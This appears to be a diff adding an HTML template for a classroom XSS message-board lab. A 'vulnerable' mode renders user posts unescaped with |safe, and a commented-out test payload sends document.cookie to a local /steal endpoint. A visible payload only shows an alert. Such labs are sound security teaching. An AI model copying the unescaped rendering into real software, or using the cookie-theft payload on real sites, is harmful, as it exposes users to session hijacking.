@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>留言板 </title>
+    <link rel="stylesheet" href="/static/xss_board.css">
+</head>
+
+<body>
+    <div class="container">
+
+        <h1>XSS 留言板 Demo</h1>
+        <p>目前登入使用者：<b>{{ user_id }}</b></p>
+
+        {% if teacher %}
+            <a class="admin-btn" href="/admin">🔧 管理使用者</a>
+            <form method="post" action="/admin/clear_messages"><input type="hidden" name="csrf_token" value="{{ token() }}"><button class="clear-btn">清除所有留言</button></form>
+        {% endif %}
+
+        <form method="post" action="/logout"><input type="hidden" name="csrf_token" value="{{ token() }}"><button class="logout">登出</button></form>
+
+        <div class="lab-links"><a href="/security">更改安全設定（{{ mode }}）</a><a href="/teacher/login">教師登入</a></div><hr><br>
+
+        <!-- <div class="danger">
+            🧪 測試 Payload：
+            <code>&lt;script&gt;fetch("http://127.0.0.1:5001/steal?cookie=" + document.cookie);&lt;/script&gt;</code>
+            
+        </div> -->
+
+        <div class="danger">
+            🧪 測試 Payload：
+            <code>&lt;script&gt;alert("XSS exists!!");&lt;/script&gt;</code>
+            
+        </div>
+        <h2>發表留言</h2>
+        <form method="post"><input type="hidden" name="csrf_token" value="{{ token() }}">
+            <textarea name="content" placeholder="想說什麼呢？"></textarea>
+            <button type="submit">送出留言</button>
+        </form>
+
+        <h2>留言列表</h2>
+
+        {% if messages %}
+        {% for mid, uid, msg in messages %}
+        <div class="msg">
+            <div class="uid">{{ uid }}：</div>
+            <div class="content">{% if mode == 'vulnerable' %}{{ msg|safe }}{% else %}{{ msg }}{% endif %}</div>
+
+            {% if uid == user_id %}
+            <form method="post" action="/delete_message/{{ mid }}"><input type="hidden" name="csrf_token" value="{{ token() }}">
+                <button class="delete-btn" type="submit">刪除</button>
+            </form>
+            {% endif %}
+        </div>
+        {% endfor %}
+        {% else %}
+        <p>目前沒有留言。</p>
+        {% endif %}
+
+    </div>
+{% include 'original_footer.html' %}
+</body>
+
+</html>
